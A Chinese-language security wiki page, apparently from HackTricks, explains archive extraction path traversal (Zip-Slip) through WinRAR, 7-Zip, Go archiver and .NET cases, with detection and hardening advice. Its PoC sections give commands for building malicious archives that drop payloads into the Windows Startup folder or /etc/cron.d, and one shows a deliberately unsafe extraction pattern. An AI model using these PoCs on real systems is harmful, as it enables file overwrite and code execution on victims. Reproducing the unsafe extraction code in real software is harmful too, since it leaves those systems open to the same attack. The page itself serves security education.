# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 概述

许多 archive 格式（ZIP、RAR、TAR、7-ZIP 等）允许每个条目携带自己的 **internal path**。当 extraction utility 盲目遵循该路径时，包含 `..` 或 **absolute path**（例如 `C:\Windows\System32\`）的 crafted filename 将被写入用户选择目录之外。
此类 vulnerability 广为人知的名称是 *Zip-Slip* 或 **archive extraction path traversal**。<sup>[[6]](#references)</sup>

后果包括覆盖任意文件，甚至可以通过将 payload 放入 Windows *Startup* folder 等 **auto-run** 位置，直接实现 **remote code execution (RCE)**。

## 根本原因

1. Attacker 创建一个 archive，其中一个或多个 file header 包含：
* Relative traversal sequences (`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* Absolute paths (`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* 或者 crafted **symlinks**，其解析结果位于 target dir 之外（在 *nix* 的 ZIP/TAR 中很常见）。
2. Victim 使用存在 vulnerability 的 tool 解压 archive；该 tool 信任嵌入的路径（或遵循 symlinks），而不是对其进行 sanitising，或强制在所选目录下进行 extraction。
3. 文件被写入 attacker-controlled location，并在系统或 user 下次触发该路径时被 executed/loaded。

### .NET `Path.Combine` + `ZipArchive` traversal

一种常见的 .NET anti-pattern 是将预期的 destination 与 **user-controlled** `ZipArchiveEntry.FullName` 进行组合，并在未进行 path normalisation 的情况下 extraction：<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- 如果 `entry.FullName` 以 `..\\` 开头，则会发生 traversal；如果它是一个 **absolute path**，左侧组件会被完全丢弃，从而以提取身份实现 **arbitrary file write**。
- 用于写入由 scheduled scanner 监控的同级 `app` 目录的 proof-of-concept archive：
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
将该 ZIP 放入受监控的 inbox 后，会生成 `C:\samples\app\0xdf.txt`，证明可以遍历到 `C:\samples\queue\` 之外，并启用后续利用原语（例如 DLL hijacks）。

## 真实案例 – WinRAR ≤ 7.12（CVE-2025-8088）

Windows 版 WinRAR（包括 `rar` / `unrar` CLI、DLL 和 portable source）在解压过程中未能验证文件名。
包含如下条目的恶意 RAR archive：
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
最终会位于所选输出目录**之外**，并进入用户的 *Startup* 文件夹。登录后，Windows 会自动执行其中的所有内容，从而实现*持久化* RCE。<sup>[[5]](#references)</sup>

### 制作 PoC Archive（Linux/Mac）
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
使用的选项：
* `-ep`  – 按给定方式准确存储文件路径（**不要**删除开头的 `./`）。

将 `evil.rar` 发送给受害者，并指示其使用存在漏洞的 WinRAR 构建版本进行解压。

### 在野外观察到的 Exploitation

ESET 报告称，RomCom（Storm-0978/UNC2596）的 spear-phishing 活动会附加滥用 CVE-2025-8088 的 RAR 压缩包，以部署定制 backdoor 并协助 ransomware 运营。<sup>[[5]](#references)</sup>

## 更新案例（2024–2025）

### 7-Zip ZIP symlink traversal → RCE（CVE-2025-11001 / ZDI-25-949）
* **Bug**：ZIP 条目中的 **symbolic links** 在解压期间会被 dereference，使攻击者能够逃出目标目录并覆盖任意路径。用户只需*打开/解压*压缩包即可触发。<sup>[[1]](#references)</sup>
* **受影响版本**：7-Zip 21.02–24.09（Windows 和 Linux 构建版本）。已在 **25.00**（2025 年 7 月）及更高版本中修复。
* **Impact path**：覆盖 `Start Menu/Programs/Startup` 或由 service 运行的位置 → 在下次登录或 service 重启时执行代码。
* **快速 PoC（Linux）**：
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
在 patched build 中不会触碰 `/etc/cron.d`；symlink 会作为 `/tmp/target` 内的 link 被解压。

### Go mholt/archiver Unarchive() Zip-Slip（CVE-2025-3445）
* **Bug**：`archiver.Unarchive()` 会跟随 `../` 和 symlinked ZIP entries，将内容写入 `outputDir` 外部。<sup>[[2]](#references)</sup>
* **受影响版本**：`github.com/mholt/archiver` ≤ 3.5.1（该项目现已 deprecated）。
* **修复**：切换到 `mholt/archives` ≥ 0.1.0，或在写入前实施 canonical-path checks。
* **最小复现**：
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – 列出 archive entries，并标记名称中包含 `../`、`..\\`、*absolute paths*（`/`、`C:`）的条目，或标记目标位于 extraction dir 外部的 *symlink* 类型条目。
* **Canonicalisation** – 确保 `realpath(join(dest, name))` 仍以 `dest` 开头，否则拒绝。<sup>[[3]](#references)</sup>
* **Sandbox extraction** – 使用 *safe* extractor（例如 `bsdtar --safe --xattrs --no-same-owner`、7-Zip ≥ 25.00）将内容解压到 disposable directory，并验证生成的路径仍位于该目录内。
* **Endpoint monitoring** – 当 WinRAR/7-Zip 等程序打开 archive 后，如果在短时间内有新的 executable 被写入 `Startup`/`Run`/`cron` 位置，则发出警报。

## Mitigation & Hardening

1. **更新 extractor** – WinRAR 7.13+ 和 7-Zip 25.00+ 已实现 path/symlink sanitisation。两款工具仍不支持 auto-update。
2. 尽可能使用“**Do not extract paths**”/“**Ignore paths**”解压 archives。
3. 在 Unix 上，在解压前降低 privileges 并挂载 **chroot/namespace**；在 Windows 上，使用 **AppContainer** 或 sandbox。
4. 如果编写 custom code，请在 create/write **之前**使用 `realpath()`/`PathCanonicalize()` 进行 normalise，并拒绝任何逃出目标目录的 entry。

## 其他受影响 / 历史案例

* 2018 – Snyk 发布大规模 *Zip-Slip* advisory，影响众多 Java/Go/JS libraries。<sup>[[6]](#references)</sup>
* 2023 – 7-Zip CVE-2023-4011，在 `-ao` merge 期间存在类似 traversal。
* 2025 – HashiCorp `go-slug`（CVE-2025-0377）中的 TAR extraction traversal，影响 slugs（v1.2 中已修复）。<sup>[[7]](#references)</sup>
* 任何在写入前未调用 `PathCanonicalize`/`realpath` 的 custom extraction logic。

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – Prevent Zip Slip in .NET](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – Update WinRAR tools now: RomCom and others exploiting zero-day vulnerability (CVE-2025-8088)](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)
- [6] [Snyk – Public Disclosure of a Critical Arbitrary File Overwrite Vulnerability: Zip Slip](https://snyk.io/blog/zip-slip-vulnerability/)
- [7] [HashiCorp – HCSEC-2025-01: go-slug Vulnerable to Zip Slip Attack (CVE-2025-0377)](https://discuss.hashicorp.com/t/hcsec-2025-01-hashicorp-go-slug-vulnerable-to-zip-slip-attack/72719)

{{#include ../banners/hacktricks-training.md}}
